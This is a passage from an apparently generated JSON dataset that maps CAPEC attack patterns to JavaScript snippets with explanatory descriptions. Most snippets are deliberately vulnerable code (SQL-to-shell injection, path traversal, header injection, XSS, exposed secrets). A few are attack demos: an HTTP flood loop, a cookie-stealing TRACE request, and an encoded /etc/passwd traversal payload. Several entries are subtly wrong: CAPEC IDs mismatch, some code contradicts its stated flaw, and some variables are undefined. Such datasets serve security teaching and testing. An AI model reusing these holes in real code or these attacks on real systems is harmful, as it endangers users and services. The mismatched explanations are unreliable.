        "description": "This JavaScript code sets up a basic HTTP server using Node.js. It takes user input from the URL query string and includes it directly in an HTTP header without proper sanitization. This can lead to HTTP Request Splitting if the user input contains CRLF sequences (\\r\\n), which can be interpreted as the end of one HTTP header and the start of another. This vulnerability is related to CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers) and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component). The code demonstrates how an attacker could exploit discrepancies in HTTP request parsing to inject malicious headers or requests."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  const userInput = req.body.userInput;\n  fs.appendFile('server.log', `User input: ${userInput}\\n`, (err) => {\n    if (err) throw err;\n  });\n  res.send(`<html><body>User input logged: ${userInput}</body></html>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Express.js application that logs user input to a server log file and then reflects that input back to the user in an HTML response. The vulnerability arises from improper neutralization of user input, which can lead to Cross-Site Scripting (XSS) attacks. Specifically, the user input is directly appended to a log file and included in the HTML response without any sanitization or escaping. This can be exploited by an attacker to inject malicious scripts, which can then be executed in the context of another user's browser. The code embodies the main idea of the deprecated CAPEC 'XSS through Log Files' by showing how user input can be logged and then reflected in a web page, leading to potential XSS vulnerabilities."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('TRACE', 'https://example.com', true);\nxhr.onreadystatechange = function() {\n  if (xhr.readyState === 4 && xhr.status === 200) {\n    console.log(xhr.responseText);\n  }\n};\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates a Cross Site Tracing (XST) attack. It sends an HTTP TRACE request to 'https://example.com'. If the server supports the TRACE method, it will echo back the request headers, including any cookies. This can be exploited by an attacker to steal session cookies and other sensitive information. The code leverages the XMLHttpRequest object to perform the TRACE request and logs the response, which could contain sensitive data. This example highlights the vulnerability described in CAPEC-111 and related CWEs, such as CWE-693 (Protection Mechanism Failure) and CWE-352 (Cross-Site Request Forgery), by showing how an attacker can misuse HTTP methods to compromise security."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst { exec } = require('child_process');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test'\n});\n\napp.get('/execute', (req, res) => {\n  const userInput = req.query.id;\n  const query = `SELECT command FROM commands WHERE id = '${userInput}'`;\n  connection.query(query, (error, results) => {\n    if (error) throw error;\n    const command = results[0].command;\n    exec(command, (err, stdout, stderr) => {\n      if (err) {\n        res.send(`Error: ${stderr}`);\n        return;\n      }\n      res.send(`Output: ${stdout}`);\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web application using Express and MySQL that is vulnerable to command line execution through SQL injection. The application takes user input from a query parameter 'id' and constructs an SQL query without proper input validation or sanitization (CWE-89). The result of the SQL query is then used directly as an argument in an OS command execution (CWE-78), which can lead to OS command injection. This code embodies the main idea of the CAPEC by showing how an attacker can inject malicious data into the database and later have it executed as a command on the host system."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst { Sequelize, QueryTypes } = require('sequelize');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst sequelize = new Sequelize('database', 'username', 'password', {\n  host: 'localhost',\n  dialect: 'mysql'\n});\n\napp.post('/search', async (req, res) => {\n  const userInput = req.body.searchTerm;\n  try {\n    const results = await sequelize.query(`SELECT * FROM users WHERE name = '${userInput}'`, { type: QueryTypes.SELECT });\n    res.json(results);\n  } catch (error) {\n    res.status(500).send('Database error');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of an Object Relational Mapping (ORM) injection using the Sequelize ORM in a Node.js application. The code sets up an Express server with a single POST endpoint '/search' that takes a user input from the request body and uses it to construct a raw SQL query. The query is executed directly against the database using Sequelize's query method. This approach is vulnerable to SQL injection because the user input is not properly sanitized or validated, allowing an attacker to inject malicious SQL commands. This example embodies the main idea of CAPEC-20, CAPEC-89, CAPEC-564, CAPEC-943, and CAPEC-1083 by demonstrating improper input validation and improper neutralization of special elements in the data query logic."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst mysql = require('mysql');\n\nconst service = {\n  MyService: {\n    MyPort: {\n      MyFunction: function(args) {\n        const userId = args.userId;\n        const connection = mysql.createConnection({\n          host: 'localhost',\n          user: 'root',\n          password: 'password',\n          database: 'mydb'\n        });\n\n        connection.connect();\n\n        // Vulnerable SQL query construction\n        const query = `SELECT * FROM users WHERE id = '${userId}'`;\n\n        connection.query(query, function(error, results, fields) {\n          if (error) throw error;\n          console.log(results);\n        });\n\n        connection.end();\n      }\n    }\n  }\n};\n\nconst xml = require('fs').readFileSync('myservice.wsdl', 'utf8');\nsoap.listen(server, '/wsdl', service, xml);",
        "description": "This JavaScript code snippet demonstrates a SOAP-based web service that is vulnerable to SQL Injection through SOAP Parameter Tampering. The service defines a function 'MyFunction' that takes a 'userId' parameter from the SOAP message. This parameter is directly used to construct an SQL query without proper validation or parameter binding, making it susceptible to SQL injection attacks. An attacker can manipulate the 'userId' parameter in the SOAP request to alter the SQL query's structure, potentially gaining unauthorized access to the database. This example highlights the importance of proper input validation and the use of parameterized queries to prevent SQL injection vulnerabilities."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "function fetchData() {\n  var script = document.createElement('script');\n  script.src = 'https://vulnerable-site.com/data.json';\n  document.body.appendChild(script);\n}\n\nfunction handleData(data) {\n  // Process the JSON data\n  console.log(data);\n}\n\n// Simulate an attacker including this script on their malicious site\nfetchData();",
        "description": "This JavaScript code snippet demonstrates a JSON Hijacking attack. The `fetchData` function dynamically creates a script element that loads a JSON file from a vulnerable site. The JSON data is then processed by the `handleData` function. This code exploits the browser's Same Origin Policy loophole, allowing the attacker to include and execute JavaScript from another website. The related CWEs are represented as follows: CWE-345 and CWE-346 are shown by the lack of verification of the data's origin, CWE-352 is implied by the potential for CSRF attacks, CWE-79 is relevant if the JSON data includes malicious scripts, and CWE-602 is demonstrated by the reliance on client-side enforcement of security."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "const users = { 'user1': 'password123', 'user2': 'password456' }; // CWE-521\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Access granted';\n  } else {\n    return 'Access denied';\n  }\n}\n\n// Brute force attack simulation\nconst bruteForceAttack = (username) => {\n  const possiblePasswords = ['password123', 'password456', 'password789']; // CWE-330\n  for (let i = 0; i < possiblePasswords.length; i++) {\n    if (authenticate(username, possiblePasswords[i]) === 'Access granted') {\n      console.log(`Password for ${username} is ${possiblePasswords[i]}`);\n      break;\n    }\n  }\n};\n\nbruteForceAttack('user1');",
        "description": "This JavaScript code snippet demonstrates a brute force attack on a simple authentication system. The `users` object stores usernames and their corresponding passwords, which are weak and predictable (CWE-521). The `authenticate` function checks if the provided username and password match the stored values. The `bruteForceAttack` function simulates a brute force attack by iterating through a list of possible passwords (CWE-330) and attempting to authenticate with each one. If a correct password is found, it logs the password to the console. This code highlights the vulnerability of using weak passwords and insufficiently random values, making the system susceptible to brute force attacks."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "const fs = require('fs');\n\n// Vulnerable function that manipulates file system interface\nfunction manipulateFileSystem(path) {\n  // CWE-1262: Improper Access Control for Register Interface\n  // Here, we are using a file system path without proper access control\n  fs.writeFileSync(path, 'This is a test');\n}\n\n// CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n// Simulating activation of debug mode at runtime\nfunction activateDebugMode() {\n  // This function can be called at runtime to change system behavior\n  console.log('Debug mode activated');\n}\n\n// CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\n// Simulating access to an unprotected alternate interface\nfunction accessAlternateInterface() {\n  // Accessing an alternate path without proper protection\n  console.log('Accessing alternate interface');\n}\n\n// Example usage\nmanipulateFileSystem('/etc/passwd'); // Dangerous operation\nactivateDebugMode(); // Activating debug mode\naccessAlternateInterface(); // Accessing alternate interface",
        "description": "This JavaScript code snippet demonstrates the concept of 'Interface Manipulation' by showcasing improper access control and manipulation of different interfaces. The `manipulateFileSystem` function represents CWE-1262 by writing to a file system path without proper access control, potentially allowing unauthorized modifications. The `activateDebugMode` function simulates CWE-1313 by allowing the activation of debug logic at runtime, which can change the system's behavior and expose sensitive data. The `accessAlternateInterface` function illustrates CWE-1299 by accessing an alternate interface without proper protection, potentially bypassing existing security measures. These examples collectively highlight how manipulating interfaces can lead to security vulnerabilities."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "const users = { 'admin': 'password123' }; \n\nfunction authenticate(username, password) { \n  if (users[username] && users[username] === password) { \n    return 'Access granted'; \n  } else { \n    return 'Access denied'; \n  } \n} \n\n// Vulnerable to brute force attacks due to lack of rate limiting \nfor (let i = 0; i < 1000; i++) { \n  console.log(authenticate('admin', 'password' + i)); \n}",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to several weaknesses described in the CAPEC and related CWEs. The `authenticate` function checks if the provided username and password match the stored credentials. However, it lacks proper rate limiting, making it susceptible to brute force attacks (CWE-307). Additionally, the use of a weak password ('password123') and the simplistic authentication logic represent weak authentication (CWE-1390). The code also does not sufficiently prove the claimed identity, leading to improper authentication (CWE-287). The for loop simulates an attack by attempting multiple password guesses in a short time frame."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check authentication\napp.use((req, res, next) => {\n  if (req.query.authToken === 'valid-token') {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Vulnerable endpoint that bypasses authentication\napp.get('/admin', (req, res) => {\n  if (req.query.bypass === 'true') {\n    res.send('Access granted to admin panel');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with an authentication middleware. The middleware checks for a valid authentication token in the query parameters. However, the '/admin' endpoint contains a vulnerability that allows authentication bypass if the 'bypass' query parameter is set to 'true'. This represents the CAPEC 'Authentication Bypass' by demonstrating how an attacker can gain unauthorized access by exploiting an alternate path or channel (CWE-288) and weak authentication mechanisms (CWE-1390)."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst userProvidedPath = process.argv[2];\nconst sensitiveFilePath = path.join(userProvidedPath, 'sensitive_info.txt');\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfs.readFile(sensitiveFilePath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading file:', err);\n    return;\n  }\n  console.log('Sensitive Data:', data);\n});\n\n// CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\nif (process.env.DEBUG) {\n  console.log('Debug Mode: Sensitive information access is not restricted.');\n  console.log('Sensitive Data:', data);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can exploit the system by providing an untrusted search path (CWE-426) to access sensitive information (CWE-200). The code reads a sensitive file from a user-provided path and logs its contents, potentially exposing sensitive information to unauthorized actors. Additionally, if the application is in debug mode (CWE-1243), it further exposes sensitive information without restriction. This embodies the CAPEC concept of 'Excavation,' where an adversary probes the system to extract sensitive information for malicious purposes."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/login',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Sending sensitive information in cleartext\nconst postData = 'username=admin&password=secret';\nreq.write(postData);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP POST request to a server, sending sensitive information (username and password) in cleartext. This embodies the main idea of CAPEC-157 (Interception) by illustrating how an adversary could intercept sensitive data transmitted over an unencrypted channel. The code is vulnerable to CWE-319 (Cleartext Transmission of Sensitive Information) because it sends the username and password without encryption, making it susceptible to interception by unauthorized actors. Additionally, it touches on CWE-924 (Improper Enforcement of Message Integrity During Transmission) as there is no mechanism to ensure the integrity of the message during transmission."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "function isValidInput(input) {\n  // Incomplete list of disallowed inputs\n  const disallowed = ['<script>', '%2E', '%252E'];\n  // Validate before filter\n  if (input.includes('..')) {\n    return false;\n  }\n  // Permissive list of allowed inputs\n  const allowed = ['a', 'b', 'c'];\n  for (let char of input) {\n    if (!allowed.includes(char) && !disallowed.includes(char)) {\n      return false;\n    }\n  }\n  return true;\n}\n\n// Example usage\nconst userInput = '%252E%252E%252Fetc%252Fpasswd';\nconsole.log(isValidInput(userInput)); // Expected to be true, but should be false",
        "description": "This JavaScript code snippet demonstrates a function `isValidInput` that attempts to validate user input. The function contains several vulnerabilities related to the CAPEC description of Double Encoding and the associated CWEs. The `disallowed` list is incomplete, missing many potential harmful inputs. The function validates the input for '..' before filtering, which is an incorrect behavior order. The `allowed` list is too permissive, allowing potentially harmful characters. The example usage shows how a doubly encoded payload (`%252E%252E%252Fetc%252Fpasswd`) can bypass the validation, representing the main idea of the CAPEC: using double encoding to bypass filters."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Debug mode flag\nconst debugMode = true;\n\n// Sample debug endpoint\nif (debugMode) {\n  app.get('/debug-info', (req, res) => {\n    // Exposing sensitive information for debugging purposes\n    res.send({\n      secretKey: '12345-ABCDE',\n      dbConnectionString: 'mongodb://user:password@localhost:27017/db'\n    });\n  });\n}\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server with a debug mode flag. When the debug mode is enabled, it exposes a debug endpoint '/debug-info' that returns sensitive information such as a secret key and a database connection string. This embodies the main idea of CAPEC-Non-Production Interfaces, where an adversary can exploit a debug interface unintentionally left enabled in a production environment. The related CWEs are represented by the exposure of sensitive information (CWE-489, CWE-1295) and the presence of active debug code (CWE-489)."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Mock user data\nconst users = [\n  { id: 1, username: 'admin', role: 'admin' },\n  { id: 2, username: 'user', role: 'user' }\n];\n\n// Mock sensitive data\nconst sensitiveData = 'Sensitive Information';\n\n// Middleware to check if user is authenticated\nfunction isAuthenticated(req, res, next) {\n  const userId = req.headers['user-id'];\n  req.user = users.find(user => user.id == userId);\n  if (req.user) {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Route to access sensitive data\napp.get('/sensitive', isAuthenticated, (req, res) => {\n  if (req.user.role === 'admin') {\n    res.send(sensitiveData);\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with a route that serves sensitive data. The 'isAuthenticated' middleware checks if the user is authenticated by looking up the user based on a 'user-id' header. The '/sensitive' route then checks if the authenticated user has the 'admin' role before serving the sensitive data. If the user is not an admin, a '403 Forbidden' response is sent. This code demonstrates the concept of 'Privilege Abuse' by ensuring that only users with the appropriate privileges (admin role) can access sensitive information, addressing issues related to improper privilege management (CWE-269), incorrect permission assignment (CWE-732), and improper access control (CWE-284)."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "function vulnerableFunction(input) {\n  var buffer = new Array(10).fill(0);\n  for (var i = 0; i <= input.length; i++) {\n    buffer[i] = input.charCodeAt(i);\n  }\n  return buffer;\n}\n\n// Example usage\nvar userInput = 'A very long input string that exceeds buffer size';\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer manipulation vulnerability, specifically a buffer overflow (CWE-119). The function `vulnerableFunction` takes an input string and attempts to store its character codes into a fixed-size buffer of 10 elements. The loop iterates over the length of the input string, which can exceed the buffer's allocated size, leading to an out-of-bounds write. This can result in overwriting adjacent memory, potentially causing unexpected behavior or security vulnerabilities. The code embodies the main idea of CAPEC-1000 by showing how improper handling of buffer boundaries can be exploited."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "const fs = require('fs');\n\nlet sharedResource = 0;\n\nfunction readResource() {\n  return sharedResource;\n}\n\nfunction writeResource(value) {\n  sharedResource = value;\n}\n\nfunction simulateRaceCondition() {\n  for (let i = 0; i < 1000; i++) {\n    setTimeout(() => {\n      let temp = readResource();\n      temp += 1;\n      writeResource(temp);\n    }, Math.random() * 100);\n  }\n}\n\nsimulateRaceCondition();\n\nsetTimeout(() => {\n  console.log('Final value of sharedResource:', readResource());\n}, 2000);",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability, which is a form of shared resource manipulation. The shared resource here is a simple variable `sharedResource` that is accessed and modified by multiple asynchronous operations without proper synchronization. The `simulateRaceCondition` function spawns multiple asynchronous tasks that read and write to the shared resource, potentially causing inconsistent or corrupted data. This example embodies the main idea of CAPEC-19 (Shared Resource Manipulation) and CWE-662 (Improper Synchronization) by showing how concurrent access to a shared resource without proper synchronization can lead to unpredictable behavior."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/',\n  method: 'GET'\n};\n\nfor (let i = 0; i < 1000000; i++) {\n  const req = http.request(options, res => {\n    res.on('data', d => {});\n  });\n\n  req.on('error', error => {\n    console.error(error);\n  });\n\n  req.end();\n}",
        "description": "This JavaScript code snippet demonstrates a basic flooding attack using HTTP requests. The code repeatedly sends a large number of GET requests to a target server ('target-server.com'). This type of attack can overwhelm the server's resources, leading to denial of service for legitimate users. The code embodies the main idea of CAPEC-404 (Flooding) by rapidly engaging in a large number of interactions with the target. It also touches on related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption), as the server may not have proper rate limiting or resource management in place to handle such a high volume of requests."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const basePath = path.join(__dirname, 'restricted');\n  const requestedPath = path.join(basePath, req.url);\n\n  fs.readFile(requestedPath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'restricted' directory based on the URL requested by the client. The code constructs the file path by joining the base directory path with the requested URL path. However, it does not properly validate or sanitize the input path, making it vulnerable to path traversal attacks. An attacker could exploit this by sending requests with '../' sequences to access files outside the 'restricted' directory, such as 'http://127.0.0.1:3000/../secret.txt'. This demonstrates the main idea of the CAPEC and related CWEs, where insufficient input validation allows unauthorized access to files outside the intended directory."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n\n  fs.stat(filePath, (err, stats) => {\n    if (err) {\n      res.writeHead(404, { 'Content-Type': 'text/plain' });\n      res.end('Not Found');\n      return;\n    }\n\n    if (stats.isDirectory()) {\n      fs.readdir(filePath, (err, files) => {\n        if (err) {\n          res.writeHead(500, { 'Content-Type': 'text/plain' });\n          res.end('Server Error');\n          return;\n        }\n\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end(files.join('\\n'));\n      });\n    } else {\n      fs.readFile(filePath, (err, content) => {\n        if (err) {\n          res.writeHead(500, { 'Content-Type': 'text/plain' });\n          res.end('Server Error');\n          return;\n        }\n\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end(content);\n      });\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server responds to incoming requests by checking if the requested path is a directory. If it is, the server lists the contents of the directory. If the path is a file, the server reads and returns the file's content. This code embodies the main idea of CAPEC-126 (Directory Indexing) by potentially exposing directory contents to unauthorized users. The related CWEs are represented as follows:\n- CWE-424: The code does not protect alternate paths, allowing directory listing.\n- CWE-425: The code does not enforce authorization checks on directory access.\n- CWE-288: The code does not require authentication for accessing directory contents.\n- CWE-285: The code does not perform authorization checks for accessing resources.\n- CWE-732: The code may expose critical resources by listing directory contents.\n- CWE-276: The default permissions may allow unintended access to files.\n- CWE-693: The code lacks protection mechanisms to prevent directory indexing."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "function processInput(input) {\n  let maxInt = 2147483647; // Maximum value for a 32-bit signed integer\n  let result = input + 1;\n\n  if (result > maxInt) {\n    console.log('Integer overflow detected!');\n    return;\n  }\n\n  if (result < 0) {\n    console.log('Unexpected negative value detected!');\n    return;\n  }\n\n  console.log('Processed value:', result);\n}\n\n// Example usage\nprocessInput(2147483647); // This will cause an integer overflow\nprocessInput(-1); // This will cause an unexpected negative value",
        "description": "This JavaScript code snippet demonstrates an integer attack scenario by manipulating integer values. The function `processInput` takes an integer input and adds 1 to it. It checks for integer overflow by comparing the result with the maximum value for a 32-bit signed integer. If the result exceeds this maximum value, it logs an overflow detection message. Additionally, it checks if the result is negative, which could indicate an unexpected sign extension or wraparound. The code highlights potential vulnerabilities related to integer overflows and unexpected negative values, aligning with the CAPEC description and related CWEs."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "function vulnerableFunction(input) {\n  let buffer = new ArrayBuffer(8);\n  let view = new DataView(buffer);\n  let pointer = input;\n\n  // CWE-823: Use of Out-of-range Pointer Offset\n  if (pointer < 0 || pointer >= buffer.byteLength) {\n    console.log('Pointer out of range');\n    return;\n  }\n\n  // CWE-822: Untrusted Pointer Dereference\n  try {\n    let value = view.getInt32(pointer, true);\n    console.log('Value at pointer:', value);\n  } catch (e) {\n    console.log('Error dereferencing pointer:', e);\n  }\n}\n\n// Example usage\nvulnerableFunction(10); // Out of range pointer\nvulnerableFunction(-1); // Negative pointer\nvulnerableFunction(4);  // Valid pointer",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that manipulates a pointer based on user input. The function `vulnerableFunction` takes an input value and uses it as a pointer to access an ArrayBuffer. The code checks if the pointer is within the valid range of the buffer (CWE-823: Use of Out-of-range Pointer Offset). If the pointer is out of range, it logs an error message. Otherwise, it attempts to dereference the pointer (CWE-822: Untrusted Pointer Dereference) and logs the value at the pointer location. This code embodies the main idea of the CAPEC by showing how manipulating a pointer can lead to accessing unintended memory locations, potentially causing crashes or unauthorized data access."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "function allocateExcessiveMemory(size) {\n  let arr = [];\n  try {\n    for (let i = 0; i < size; i++) {\n      arr.push(new Array(1e6).fill('A'));\n    }\n  } catch (e) {\n    console.error('Memory allocation failed:', e);\n  }\n}\n\n// Example usage: allocateExcessiveMemory(1000);",
        "description": "This JavaScript code snippet demonstrates an excessive allocation attack by allocating a large amount of memory in a loop. The function `allocateExcessiveMemory` takes a parameter `size` which determines the number of large arrays (each with 1 million elements) to be allocated. This can lead to memory exhaustion, thereby reducing the resources available for legitimate services. The code does not impose any limits on the size or number of allocations, embodying CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption). The try-catch block is used to handle any potential memory allocation failures gracefully."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filePath) {\n  let fileHandle;\n  try {\n    fileHandle = fs.openSync(filePath, 'r');\n    const data = fs.readFileSync(fileHandle, 'utf8');\n    console.log(data);\n  } catch (err) {\n    console.error('Error reading file:', err);\n  } finally {\n    // Improper resource shutdown or release\n    // Missing release of resource after effective lifetime\n    // fs.closeSync(fileHandle); // This line is commented out, causing a resource leak\n  }\n}\n\n// Example usage\nreadFile('example.txt');",
        "description": "This JavaScript code snippet demonstrates a resource leak vulnerability by not properly releasing a file handle after its use. The `readFile` function opens a file and reads its contents, but the file handle is not closed in the `finally` block, leading to a resource leak. This embodies the CAPEC 'Resource Leak Exposure' by depleting the file handles available to the system, potentially affecting legitimate requests. The related CWEs are represented as follows: CWE-404 (Improper Resource Shutdown or Release) and CWE-772 (Missing Release of Resource after Effective Lifetime). The commented-out line `fs.closeSync(fileHandle);` indicates the correct way to release the resource, highlighting the vulnerability."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(filePath) {\n  // Check if the file exists\n  if (fs.existsSync(filePath)) {\n    // Read the file\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        console.error('Error reading file:', err);\n        return;\n      }\n      console.log('File content:', data);\n    });\n  } else {\n    console.error('File does not exist.');\n  }\n}\n\n// Example usage\nconst userInputPath = '/tmp/user_input.txt';\nreadFile(userInputPath);",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability to a symlink attack. The `readFile` function takes a file path as input, checks if the file exists using `fs.existsSync`, and then reads the file using `fs.readFile`. However, this code does not account for the possibility that the file path could be a symbolic link pointing to an unintended or unauthorized file. An attacker could exploit this by creating a symlink at `/tmp/user_input.txt` that points to a sensitive file, leading to unauthorized file access. This example embodies the main idea of the CAPEC by showing how improper link resolution and external control of file paths can lead to security vulnerabilities."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "const args = process.argv.slice(2);\nconst validOptions = ['--help', '--version', '--verbose'];\nconst hiddenOptions = ['--debug', '--admin', '--config'];\n\nargs.forEach(arg => {\n  if (validOptions.includes(arg)) {\n    console.log(`Option ${arg} is valid.`);\n  } else if (hiddenOptions.includes(arg)) {\n    console.log(`Option ${arg} is hidden and should not be exposed.`);\n  } else {\n    console.log(`Option ${arg} is invalid.`);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the 'Try All Common Switches' attack pattern by iterating over command-line arguments and checking them against a list of valid and hidden options. The 'validOptions' array contains options that are publicly documented and safe to use, while the 'hiddenOptions' array contains options that are not documented and should not be exposed. The code logs a message indicating whether each argument is valid, hidden, or invalid. This snippet embodies the main idea of the CAPEC by showing how an attacker might try various switches to discover hidden functionality (CWE-912) or incomplete input validation (CWE-184)."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "const http = require('http');\nconst querystring = require('querystring');\n\nhttp.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    const post = querystring.parse(body);\n    const email = post.email;\n    const subject = post.subject;\n    const message = post.message;\n\n    // Vulnerable code: directly using user input in email headers\n    const emailHeaders = `From: attacker@example.com\\r\\nTo: victim@example.com\\r\\nSubject: ${subject}\\r\\n\\r\\n${message}`;\n\n    // Simulate sending email (in reality, this would be sent via an email server)\n    console.log(emailHeaders);\n\n    res.end('Email sent');\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming POST requests. It parses the request body to extract user-provided email, subject, and message fields. The code then constructs email headers using these fields without proper neutralization or escaping, making it vulnerable to email injection attacks. An attacker could manipulate the 'subject' or 'message' fields to inject additional headers or content, potentially leading to unauthorized actions or information disclosure. This example embodies the main idea of CAPEC-139 (Email Injection) and demonstrates related weaknesses such as improper neutralization of input terminators (CWE-147) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "const userInput = prompt('Enter your name:');\nconsole.log(userInput); // Potentially dangerous if userInput contains format specifiers\n\nfunction logMessage(message) {\n  console.log(message); // CWE-134: Use of Externally-Controlled Format String\n}\n\nlogMessage(userInput);",
        "description": "This JavaScript code snippet demonstrates a potential format string injection vulnerability. The `prompt` function collects user input, which is then passed directly to `console.log` without any validation or sanitization. This embodies CWE-134 (Use of Externally-Controlled Format String) as the format string originates from an external source (user input). The code does not validate the input (CWE-20, CWE-1286) and does not neutralize special elements (CWE-74), potentially allowing an attacker to manipulate the output or cause unexpected behavior. The `logMessage` function further illustrates the improper handling of user-controlled input."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
